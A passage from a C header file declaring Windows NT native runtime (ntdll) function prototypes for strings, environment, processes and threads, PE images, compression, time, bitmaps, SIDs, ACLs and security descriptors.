    PCUNICODE_STRING String2,
    BOOLEAN CaseInSensitive
    );

BOOLEAN
NTAPI
RtlEqualUnicodeString(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN CaseInSensitive
    );

NTSTATUS
NTAPI
RtlHashUnicodeString(
    IN const UNICODE_STRING *String,
    IN BOOLEAN CaseInSensitive,
    IN ULONG HashAlgorithm,
    OUT PULONG HashValue
    );

NTSTATUS
NTAPI
RtlValidateUnicodeString(
    IN ULONG Flags,
    IN const UNICODE_STRING *String
    );

NTSTATUS
NTAPI
RtlDuplicateUnicodeString(
    IN ULONG Flags,
    IN const UNICODE_STRING *StringIn,
    OUT UNICODE_STRING *StringOut
    );

BOOLEAN
NTAPI
RtlPrefixUnicodeString(
    IN PCUNICODE_STRING String1,
    IN PCUNICODE_STRING String2,
    IN BOOLEAN CaseInSensitive
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeString(
    PUNICODE_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlFindCharInUnicodeString(
    IN ULONG Flags,
    IN PCUNICODE_STRING StringToSearch,
    IN PCUNICODE_STRING CharSet,
    OUT USHORT *NonInclusivePrefixLength
    );

VOID
NTAPI
RtlCopyUnicodeString(
    PUNICODE_STRING DestinationString,
    PCUNICODE_STRING SourceString
    );

NTSTATUS
NTAPI
RtlAppendUnicodeStringToString (
    PUNICODE_STRING Destination,
    PCUNICODE_STRING Source
    );

NTSTATUS
NTAPI
RtlAppendUnicodeToString (
    PUNICODE_STRING Destination,
    PCWSTR Source
    );

WCHAR
NTAPI
RtlUpcaseUnicodeChar(
    WCHAR SourceCharacter
    );

WCHAR
NTAPI
RtlDowncaseUnicodeChar(
    WCHAR SourceCharacter
    );

VOID
NTAPI
RtlFreeUnicodeString(
    PUNICODE_STRING UnicodeString
    );

VOID
NTAPI
RtlFreeAnsiString(
    PANSI_STRING AnsiString
    );

VOID
NTAPI
RtlFreeOemString(
    POEM_STRING OemString
    );

ULONG
NTAPI
RtlxUnicodeStringToAnsiSize(
    PCUNICODE_STRING UnicodeString
    );

ULONG
NTAPI
RtlxUnicodeStringToOemSize(
    PCUNICODE_STRING UnicodeString
    );

ULONG
NTAPI
RtlxAnsiStringToUnicodeSize(
    PCANSI_STRING AnsiString
    );

ULONG
NTAPI
RtlxOemStringToUnicodeSize(
    PCOEM_STRING OemString
    );

NTSTATUS
NTAPI
RtlMultiByteToUnicodeN(
	OUT PWCH UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString,
	IN PCSTR MultiByteString,
	IN ULONG BytesInMultiByteString
    );

NTSTATUS
NTAPI
RtlMultiByteToUnicodeSize(
    PULONG BytesInUnicodeString,
    PCSTR MultiByteString,
    ULONG BytesInMultiByteString
    );

NTSTATUS
NTAPI
RtlUnicodeToMultiByteSize(
	OUT PULONG BytesInMultiByteString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlUnicodeToMultiByteN(
	OUT PCHAR MultiByteString,
	IN ULONG MaxBytesInMultiByteString,
	OUT OPTIONAL PULONG BytesInMultiByteString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
	);

NTSTATUS
NTAPI
RtlUpcaseUnicodeToMultiByteN(
	OUT PCHAR MultiByteString,
	IN ULONG MaxBytesInMultiByteString,
	OUT OPTIONAL PULONG BytesInMultiByteString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlOemToUnicodeN(
	OUT PWSTR UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString,
	IN PCH OemString,
	IN ULONG BytesInOemString
    );

NTSTATUS
NTAPI
RtlUnicodeToOemN(
	OUT PCHAR OemString,
	IN ULONG MaxBytesInOemString,
	OUT OPTIONAL PULONG BytesInOemString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeToOemN(
	OUT PCHAR OemString,
	IN ULONG MaxBytesInOemString,
	OUT OPTIONAL PULONG BytesInOemString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlConsoleMultiByteToUnicodeN(
	OUT PWCH UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString OPTIONAL,
	IN PCH MultiByteString,
	IN ULONG BytesInMultiByteString,
	OUT PULONG pdwSpecialChar );

BOOLEAN
NTAPI
RtlIsTextUnicode(
    IN CONST VOID* Buffer,
    IN ULONG Size,
    IN OUT PULONG Result OPTIONAL
    );

NTSTATUS
NTAPI
RtlStringFromGUID(
    IN REFGUID Guid,
    OUT PUNICODE_STRING GuidString
    );

NTSTATUS
NTAPI
RtlGUIDFromString(
    IN PUNICODE_STRING GuidString,
    OUT GUID* Guid
    );

VOID
NTAPI
RtlGenerate8dot3Name (
    IN PUNICODE_STRING Name,
    IN BOOLEAN AllowExtendedCharacters,
    IN OUT PGENERATE_NAME_CONTEXT Context,
    OUT PUNICODE_STRING Name8dot3
    );

BOOLEAN
NTAPI
RtlIsNameLegalDOS8Dot3 (
    IN PUNICODE_STRING Name,
    IN OUT POEM_STRING OemName OPTIONAL,
    IN OUT PBOOLEAN NameContainsSpaces OPTIONAL
    );

VOID
NTAPI
RtlInitializeContext(
    HANDLE Process,
    PCONTEXT Context,
    PVOID Parameter,
    PVOID InitialPc,
    PVOID InitialSp
    );

NTSTATUS
NTAPI
RtlRemoteCall(
    HANDLE Process,
    HANDLE Thread,
    PVOID CallSite,
    ULONG ArgumentCount,
    PULONG_PTR Arguments,
    BOOLEAN PassContext,
    BOOLEAN AlreadySuspended
    );

VOID
NTAPI
RtlAcquirePebLock(
	);

VOID
NTAPI
RtlReleasePebLock(
	);

NTSTATUS
NTAPI
RtlAllocateFromPeb(
	ULONG Size,
	PVOID *Block
	);

NTSTATUS
NTAPI
RtlFreeToPeb(
	PVOID Block,
	ULONG Size
	);

NTSTATUS
STDAPIVCALLTYPE
RtlSetProcessIsCritical(
    IN  BOOLEAN  NewValue,
    OUT PBOOLEAN OldValue OPTIONAL,
    IN  BOOLEAN  CheckFlag
    );

NTSTATUS
STDAPIVCALLTYPE
RtlSetThreadIsCritical(
    IN  BOOLEAN  NewValue,
    OUT PBOOLEAN OldValue OPTIONAL,
    IN  BOOLEAN  CheckFlag
    );

NTSTATUS
NTAPI
RtlCreateEnvironment(
    BOOLEAN CloneCurrentEnvironment,
    PVOID *Environment
    );

NTSTATUS
NTAPI
RtlDestroyEnvironment(
    PVOID Environment
    );

NTSTATUS
NTAPI
RtlSetCurrentEnvironment(
    PVOID Environment,
    PVOID *PreviousEnvironment
    );

NTSTATUS
NTAPI
RtlSetEnvironmentVariable(
    PVOID *Environment,
    PCUNICODE_STRING Name,
    PCUNICODE_STRING Value
    );

ULONG
RtlIsDosDeviceName_U(
	IN PWSTR DosFileName
	);

NTSTATUS
NTAPI
RtlQueryEnvironmentVariable_U (
    PVOID Environment,
    PCUNICODE_STRING Name,
    PUNICODE_STRING Value
    );

NTSTATUS
NTAPI
RtlExpandEnvironmentStrings_U(
    IN PVOID Environment OPTIONAL,
    IN PCUNICODE_STRING Source,
    OUT PUNICODE_STRING Destination,
    OUT PULONG ReturnedLength OPTIONAL
    );

VOID
NTAPI
PfxInitialize (
    PPREFIX_TABLE PrefixTable
    );

BOOLEAN
NTAPI
PfxInsertPrefix (
    PPREFIX_TABLE PrefixTable,
    PSTRING Prefix,
    PPREFIX_TABLE_ENTRY PrefixTableEntry
    );

VOID
NTAPI
PfxRemovePrefix (
    PPREFIX_TABLE PrefixTable,
    PPREFIX_TABLE_ENTRY PrefixTableEntry
    );

PPREFIX_TABLE_ENTRY
NTAPI
PfxFindPrefix (
    PPREFIX_TABLE PrefixTable,
    PSTRING FullName
    );

VOID
NTAPI
RtlInitializeUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable
    );

BOOLEAN
NTAPI
RtlInsertUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    PUNICODE_STRING Prefix,
    PUNICODE_PREFIX_TABLE_ENTRY PrefixTableEntry
    );

VOID
NTAPI
RtlRemoveUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    PUNICODE_PREFIX_TABLE_ENTRY PrefixTableEntry
    );

PUNICODE_PREFIX_TABLE_ENTRY
NTAPI
RtlFindUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    PUNICODE_STRING FullName,
    ULONG CaseInsensitiveIndex
    );

PUNICODE_PREFIX_TABLE_ENTRY
NTAPI
RtlNextUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    BOOLEAN Restart
    );

NTSTATUS
NTAPI
RtlGetCompressionWorkSpaceSize (
    IN USHORT CompressionFormatAndEngine,
    OUT PULONG CompressBufferWorkSpaceSize,
    OUT PULONG CompressFragmentWorkSpaceSize
    );

NTSTATUS
NTAPI
RtlCompressBuffer (
    IN USHORT CompressionFormatAndEngine,
    IN PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    OUT PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN ULONG UncompressedChunkSize,
    OUT PULONG FinalCompressedSize,
    IN PVOID WorkSpace
    );

NTSTATUS
NTAPI
RtlDecompressBuffer (
    IN USHORT CompressionFormat,
    OUT PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    IN PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    OUT PULONG FinalUncompressedSize
    );

NTSTATUS
NTAPI
RtlDecompressFragment (
    IN USHORT CompressionFormat,
    OUT PUCHAR UncompressedFragment,
    IN ULONG UncompressedFragmentSize,
    IN PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN ULONG FragmentOffset,
    OUT PULONG FinalUncompressedSize,
    IN PVOID WorkSpace
    );

NTSTATUS
NTAPI
RtlDescribeChunk (
    IN USHORT CompressionFormat,
    IN OUT PUCHAR *CompressedBuffer,
    IN PUCHAR EndOfCompressedBufferPlus1,
    OUT PUCHAR *ChunkBuffer,
    OUT PULONG ChunkSize
    );

NTSTATUS
NTAPI
RtlReserveChunk (
    IN USHORT CompressionFormat,
    IN OUT PUCHAR *CompressedBuffer,
    IN PUCHAR EndOfCompressedBufferPlus1,
    OUT PUCHAR *ChunkBuffer,
    IN ULONG ChunkSize
    );

NTSTATUS
NTAPI
RtlDecompressChunks (
    OUT PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    IN PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN PUCHAR CompressedTail,
    IN ULONG CompressedTailSize,
    IN PCOMPRESSED_DATA_INFO CompressedDataInfo
    );

NTSTATUS
NTAPI
RtlCompressChunks (
    IN PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    OUT PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN OUT PCOMPRESSED_DATA_INFO CompressedDataInfo,
    IN ULONG CompressedDataInfoLength,
    IN PVOID WorkSpace
    );

NTSTATUS
NTAPI
RtlCreateProcessParameters(
    PRTL_USER_PROCESS_PARAMETERS *ProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData
    );

NTSTATUS
NTAPI
RtlDestroyProcessParameters(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

PRTL_USER_PROCESS_PARAMETERS
NTAPI
RtlNormalizeProcessParams(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

PRTL_USER_PROCESS_PARAMETERS
NTAPI
RtlDeNormalizeProcessParams(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

NTSTATUS
NTAPI
RtlCreateUserProcess(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
    );

NTSTATUS
NTAPI
RtlCreateUserThread(
    HANDLE Process,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    SIZE_T MaximumStackSize OPTIONAL,
    SIZE_T InitialStackSize OPTIONAL,
    PUSER_THREAD_START_ROUTINE StartAddress,
    PVOID Parameter,
    PHANDLE Thread,
    PCLIENT_ID ClientId
    );

VOID
NTAPI
RtlExitUserThread (
    IN NTSTATUS ExitStatus
    );

VOID
NTAPI
RtlFreeUserThreadStack(
    HANDLE hProcess,
    HANDLE hThread
    );
/*
PVOID
NTAPI
RtlPcToFileHeader(
    PVOID PcValue,
    PVOID *BaseOfImage
    );*/

NTSTATUS
NTAPI
RtlImageNtHeaderEx(
    ULONG Flags,
    PVOID Base,
    ULONG64 Size,
    OUT PIMAGE_NT_HEADERS * OutHeaders
    );

PIMAGE_NT_HEADERS
NTAPI
RtlImageNtHeader(
    PVOID Base
    );

PVOID
NTAPI
RtlAddressInSectionTable (
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID BaseOfImage,
    IN ULONG VirtualAddress
    );

PIMAGE_SECTION_HEADER
NTAPI
RtlSectionTableFromVirtualAddress (
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID BaseOfImage,
    IN ULONG VirtualAddress
    );

NTSTATUS
NTAPI
RtlImageDirectoryEntryToData(
    PVOID BaseOfImage,
    BOOLEAN MappedAsImage,
    USHORT DirectoryEntry,
    PULONG Size
    );

PVOID
RtlImageDirectoryEntryToData32 (
    IN PVOID Base,
    IN BOOLEAN MappedAsImage,
    IN USHORT DirectoryEntry,
    OUT PULONG Size
    );

PIMAGE_SECTION_HEADER
NTAPI
RtlImageRvaToSection(
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID Base,
    IN ULONG Rva
    );

PVOID
NTAPI
RtlImageRvaToVa(
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID Base,
    IN ULONG Rva,
    IN OUT PIMAGE_SECTION_HEADER *LastRvaSection OPTIONAL
    );


VOID
NTAPI
RtlCopyMemoryNonTemporal (
   VOID UNALIGNED *Destination,
   CONST VOID UNALIGNED *Source,
   SIZE_T Length
   );

VOID __fastcall
RtlPrefetchMemoryNonTemporal(
    IN PVOID Source,
    IN SIZE_T Length
    );

SIZE_T
NTAPI
RtlCompareMemoryUlong (
    PVOID Source,
    SIZE_T Length,
    ULONG Pattern
    );

VOID
NTAPI
RtlFillMemoryUlong (
   PVOID Destination,
   SIZE_T Length,
   ULONG Pattern
   );

VOID
NTAPI
RtlFillMemoryUlonglong (
   PVOID Destination,
   SIZE_T Length,
   ULONGLONG Pattern
   );

VOID
NTAPI
RtlInitializeExceptionLog(
    IN ULONG Entries
    );

LONG
NTAPI
RtlUnhandledExceptionFilter(
    IN struct _EXCEPTION_POINTERS *ExceptionInfo
    );

LONG
NTAPI
RtlUnhandledExceptionFilter2(
    IN struct _EXCEPTION_POINTERS *ExceptionInfo,
    IN PCSTR Function
    );

VOID
NTAPI
DbgUserBreakPoint(
    VOID
    );

VOID
NTAPI
DbgBreakPointWithStatus(
    IN ULONG Status
    );

ULONG
DbgPrintEx (
	IN ULONG ComponentId,
	IN ULONG Level,
	IN PCH Format,
	...
    );

ULONG
NTAPI
vDbgPrintEx(
    IN ULONG ComponentId,
    IN ULONG Level,
    IN PCH Format,
    IN va_list arglist
    );

ULONG
NTAPI
vDbgPrintExWithPrefix (
    IN PCH Prefix,
    IN ULONG ComponentId,
    IN ULONG Level,
    IN PCH Format,
    IN va_list arglist
    );

ULONG
DbgPrintReturnControlC (
	IN PCHAR Format,
	...
    );

NTSTATUS
NTAPI
DbgQueryDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level
    );

NTSTATUS
NTAPI
DbgSetDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level,
    IN BOOLEAN State
    );

ULONG
NTAPI
DbgPrompt (
	IN PCH Prompt,
	OUT PCH Response,
	IN ULONG Length
    );

VOID
NTAPI
DbgLoadImageSymbols (
	IN PSTRING FileName,
	IN PVOID ImageBase,
	IN ULONG_PTR ProcessId
    );

VOID
NTAPI
DbgUnLoadImageSymbols (
	IN PSTRING FileName,
	IN PVOID ImageBase,
	IN ULONG_PTR ProcessId
    );

VOID
NTAPI
DbgCommandString (
	IN PCH Name,
	IN PCH Command
    );

BOOLEAN
NTAPI
RtlCutoverTimeToSystemTime(
    PTIME_FIELDS CutoverTime,
    PLARGE_INTEGER SystemTime,
    PLARGE_INTEGER CurrentSystemTime,
    BOOLEAN ThisYear
    );

NTSTATUS
NTAPI
RtlSystemTimeToLocalTime (
    IN PLARGE_INTEGER SystemTime,
    OUT PLARGE_INTEGER LocalTime
    );

NTSTATUS
NTAPI
RtlLocalTimeToSystemTime (
    IN PLARGE_INTEGER LocalTime,
    OUT PLARGE_INTEGER SystemTime
    );

VOID
NTAPI
RtlTimeToElapsedTimeFields (
    IN PLARGE_INTEGER Time,
    OUT PTIME_FIELDS TimeFields
    );

VOID
NTAPI
RtlTimeToTimeFields (
    PLARGE_INTEGER Time,
    PTIME_FIELDS TimeFields
    );

BOOLEAN
NTAPI
RtlTimeFieldsToTime (
    PTIME_FIELDS TimeFields,
    PLARGE_INTEGER Time
    );

BOOLEAN
NTAPI
RtlTimeToSecondsSince1980 (
    PLARGE_INTEGER Time,
    PULONG ElapsedSeconds
    );

VOID
NTAPI
RtlSecondsSince1980ToTime (
    ULONG ElapsedSeconds,
    PLARGE_INTEGER Time
    );

BOOLEAN
NTAPI
RtlTimeToSecondsSince1970 (
    PLARGE_INTEGER Time,
    PULONG ElapsedSeconds
    );

VOID
NTAPI
RtlSecondsSince1970ToTime (
    ULONG ElapsedSeconds,
    PLARGE_INTEGER Time
    );

NTSTATUS
NTAPI
RtlQueryTimeZoneInformation(
    OUT PRTL_TIME_ZONE_INFORMATION TimeZoneInformation
    );

NTSTATUS
NTAPI
RtlSetTimeZoneInformation(
    IN PRTL_TIME_ZONE_INFORMATION TimeZoneInformation
    );

NTSTATUS
NTAPI
RtlSetActiveTimeBias(
    IN LONG ActiveBias
    );

VOID
NTAPI
RtlInitializeBitMap (
    PRTL_BITMAP BitMapHeader,
    PULONG BitMapBuffer,
    ULONG SizeOfBitMap
    );

VOID
NTAPI
RtlClearBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitNumber
    );

VOID
NTAPI
RtlSetBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitNumber
    );

BOOLEAN
NTAPI
RtlTestBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitNumber
    );

VOID
NTAPI
RtlClearAllBits (
    PRTL_BITMAP BitMapHeader
    );

VOID
NTAPI
RtlSetAllBits (
    PRTL_BITMAP BitMapHeader
    );

ULONG
NTAPI
RtlFindClearBits (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

ULONG
NTAPI
RtlFindSetBits (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

ULONG
NTAPI
RtlFindClearBitsAndSet (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

ULONG
NTAPI
RtlFindSetBitsAndClear (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

VOID
NTAPI
RtlClearBits (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG NumberToClear
    );

VOID
NTAPI
RtlSetBits (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG NumberToSet
    );

ULONG
NTAPI
RtlFindClearRuns (
    PRTL_BITMAP BitMapHeader,
    PRTL_BITMAP_RUN RunArray,
    ULONG SizeOfRunArray,
    BOOLEAN LocateLongestRuns
    );

ULONG
NTAPI
RtlFindLongestRunClear (
    PRTL_BITMAP BitMapHeader,
    PULONG StartingIndex
    );

ULONG
NTAPI
RtlFindFirstRunClear (
    PRTL_BITMAP BitMapHeader,
    PULONG StartingIndex
    );

ULONG
NTAPI
RtlNumberOfClearBits (
    PRTL_BITMAP BitMapHeader
    );

ULONG
NTAPI
RtlNumberOfSetBits (
    PRTL_BITMAP BitMapHeader
    );

BOOLEAN
NTAPI
RtlAreBitsClear (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG Length
    );

BOOLEAN
NTAPI
RtlAreBitsSet (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG Length
    );

ULONG
NTAPI
RtlFindNextForwardRunClear (
    IN PRTL_BITMAP BitMapHeader,
    IN ULONG FromIndex,
    IN PULONG StartingRunIndex
    );

ULONG
NTAPI
RtlFindLastBackwardRunClear (
    IN PRTL_BITMAP BitMapHeader,
    IN ULONG FromIndex,
    IN PULONG StartingRunIndex
    );

CCHAR
NTAPI
RtlFindLeastSignificantBit (
    IN ULONGLONG Set
    );

CCHAR
NTAPI
RtlFindMostSignificantBit (
    IN ULONGLONG Set
    );

BOOLEAN
NTAPI
RtlValidSid (
    PSID Sid
    );

BOOLEAN
NTAPI
RtlEqualSid (
    PSID Sid1,
    PSID Sid2
    );

BOOLEAN
NTAPI
RtlEqualPrefixSid (
    PSID Sid1,
    PSID Sid2
    );

ULONG
NTAPI
RtlLengthRequiredSid (
    ULONG SubAuthorityCount
    );

PVOID
NTAPI
RtlFreeSid(
    IN PSID Sid
    );

NTSTATUS
NTAPI
RtlInitializeSid(
	OUT PSID Sid,
	IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
	IN UCHAR SubAuthorityCount
	);

NTSTATUS
NTAPI
RtlAllocateAndInitializeSid(
    IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    IN UCHAR SubAuthorityCount,
    IN ULONG SubAuthority0,
    IN ULONG SubAuthority1,
    IN ULONG SubAuthority2,
    IN ULONG SubAuthority3,
    IN ULONG SubAuthority4,
    IN ULONG SubAuthority5,
    IN ULONG SubAuthority6,
    IN ULONG SubAuthority7,
    OUT PSID *Sid
    );

PSID_IDENTIFIER_AUTHORITY
NTAPI
RtlIdentifierAuthoritySid (
    PSID Sid
    );

PULONG
NTAPI
RtlSubAuthoritySid(
	IN PSID Sid,
	IN ULONG SubAuthority
	);

PUCHAR
NTAPI
RtlSubAuthorityCountSid (
    PSID Sid
    );

ULONG
NTAPI
RtlLengthSid (
    PSID Sid
    );

NTSTATUS
NTAPI
RtlCopySid (
    ULONG DestinationSidLength,
    PSID DestinationSid,
    PSID SourceSid
    );

NTSTATUS
NTAPI
RtlCopySidAndAttributesArray (
    ULONG ArrayLength,
    PSID_AND_ATTRIBUTES Source,
    ULONG TargetSidBufferSize,
    PSID_AND_ATTRIBUTES TargetArrayElement,
    PSID TargetSid,
    PSID *NextTargetSid,
    PULONG RemainingTargetSidSize
    );

NTSTATUS
NTAPI
RtlLengthSidAsUnicodeString(
    PSID Sid,
    PULONG StringLength
    );

NTSTATUS
NTAPI
RtlConvertSidToUnicodeString(
    PUNICODE_STRING UnicodeString,
    PSID Sid,
    BOOLEAN AllocateDestinationString
    );

VOID
NTAPI
RtlCopyLuid (
    PLUID DestinationLuid,
    PLUID SourceLuid
    );

VOID
NTAPI
RtlCopyLuidAndAttributesArray (
    ULONG ArrayLength,
    PLUID_AND_ATTRIBUTES Source,
    PLUID_AND_ATTRIBUTES Target
    );

BOOLEAN
NTAPI
RtlAreAllAccessesGranted(
    ACCESS_MASK GrantedAccess,
    ACCESS_MASK DesiredAccess
    );

BOOLEAN
NTAPI
RtlAreAnyAccessesGranted(
    ACCESS_MASK GrantedAccess,
    ACCESS_MASK DesiredAccess
    );

VOID
NTAPI
RtlMapGenericMask(
    PACCESS_MASK AccessMask,
    PGENERIC_MAPPING GenericMapping
    );

NTSTATUS
NTAPI
RtlCreateAcl(
	OUT PACL Acl,
	IN ULONG AclLength,
	IN ULONG AclRevision
	);

BOOLEAN
NTAPI
RtlValidAcl(
	PACL Acl
	);

NTSTATUS
NTAPI
RtlQueryInformationAcl(
	PACL Acl,
	PVOID AclInformation,
	ULONG AclInformationLength,
	ACL_INFORMATION_CLASS AclInformationClass
	);

NTSTATUS
NTAPI
RtlSetInformationAcl(
	PACL Acl,
	PVOID AclInformation,
	ULONG AclInformationLength,
	ACL_INFORMATION_CLASS AclInformationClass
	);

NTSTATUS
NTAPI
RtlAddAce(
	PACL Acl,
	ULONG AceRevision,
	ULONG StartingAceIndex,
	PVOID AceList,
	ULONG AceListLength
	);

NTSTATUS
NTAPI
RtlDeleteAce(
	PACL Acl,
	ULONG AceIndex
	);

NTSTATUS
NTAPI
RtlGetAce(
	PACL Acl,
	ULONG AceIndex,
	PVOID *Ace
	);

NTSTATUS
NTAPI
RtlSetOwnerSecurityDescriptor(
	IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
	IN OPTIONAL PSID Owner,
	IN OPTIONAL BOOLEAN OwnerDefaulted
	);

NTSTATUS
NTAPI
RtlGetOwnerSecurityDescriptor(
	IN PSECURITY_DESCRIPTOR SecurityDescriptor,
	OUT PSID *Owner,
	OUT PBOOLEAN OwnerDefaulted
	);

NTSTATUS
NTAPI
RtlAddAccessAllowedAce(
	PACL Acl,
	ULONG AceRevision,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessAllowedAceEx(
	PACL Acl,
	ULONG AceRevision,
	ULONG AceFlags,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessDeniedAce(
	PACL Acl,
	ULONG AceRevision,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessDeniedAceEx(
	PACL Acl,
	ULONG AceRevision,
	ULONG AceFlags,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAuditAccessAce(
	PACL Acl,
	ULONG AceRevision,
	ACCESS_MASK AccessMask,
	PSID Sid,
	BOOLEAN AuditSuccess,
	BOOLEAN AuditFailure
	);

NTSTATUS
NTAPI
RtlAddAuditAccessAceEx(
	PACL Acl,
	ULONG AceRevision,
	ULONG AceFlags,
	ACCESS_MASK AccessMask,
	PSID Sid,
	BOOLEAN AuditSuccess,
	BOOLEAN AuditFailure
	);

NTSTATUS
NTAPI
RtlAddAccessAllowedObjectAce(
	IN OUT PACL Acl,
	IN ULONG AceRevision,
	IN ULONG AceFlags,
	IN ACCESS_MASK AccessMask,
	IN GUID *ObjectTypeGuid OPTIONAL,
	IN GUID *InheritedObjectTypeGuid OPTIONAL,
	IN PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessDeniedObjectAce(
	IN OUT PACL Acl,
	IN ULONG AceRevision,
	IN ULONG AceFlags,
	IN ACCESS_MASK AccessMask,
	IN GUID *ObjectTypeGuid OPTIONAL,
	IN GUID *InheritedObjectTypeGuid OPTIONAL,
	IN PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAuditAccessObjectAce(
	IN OUT PACL Acl,
	IN ULONG AceRevision,
	IN ULONG AceFlags,
	IN ACCESS_MASK AccessMask,
	IN GUID *ObjectTypeGuid OPTIONAL,
	IN GUID *InheritedObjectTypeGuid OPTIONAL,
	IN PSID Sid,
	BOOLEAN AuditSuccess,
	BOOLEAN AuditFailure
	);

BOOLEAN
NTAPI
RtlFirstFreeAce(
	PACL Acl,
	PVOID *FirstFree
	);

NTSTATUS
NTAPI
RtlAddCompoundAce(
	IN PACL Acl,
	IN ULONG AceRevision,
	IN UCHAR AceType,
	IN ACCESS_MASK AccessMask,
	IN PSID ServerSid,
	IN PSID ClientSid
	);

NTSTATUS
NTAPI
RtlCreateSecurityDescriptor(
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    ULONG Revision
    );

NTSTATUS
NTAPI
RtlCreateSecurityDescriptorRelative(
    PISECURITY_DESCRIPTOR_RELATIVE SecurityDescriptor,
    ULONG Revision
    );

BOOLEAN
NTAPI
RtlValidSecurityDescriptor(
    PSECURITY_DESCRIPTOR SecurityDescriptor
    );

ULONG
NTAPI
RtlLengthSecurityDescriptor(
    PSECURITY_DESCRIPTOR SecurityDescriptor
    );

BOOLEAN
NTAPI
RtlValidRelativeSecurityDescriptor(
    IN PSECURITY_DESCRIPTOR SecurityDescriptorInput,
    IN ULONG SecurityDescriptorLength,
    IN SECURITY_INFORMATION RequiredInformation
    );

NTSTATUS
NTAPI
RtlGetControlSecurityDescriptor (
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    PSECURITY_DESCRIPTOR_CONTROL Control,
    PULONG Revision
    );

NTSTATUS
NTAPI
RtlSetControlSecurityDescriptor (
     IN PSECURITY_DESCRIPTOR pSecurityDescriptor,
     IN SECURITY_DESCRIPTOR_CONTROL ControlBitsOfInterest,
     IN SECURITY_DESCRIPTOR_CONTROL ControlBitsToSet
     );

NTSTATUS
NTAPI
RtlSetAttributesSecurityDescriptor(
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
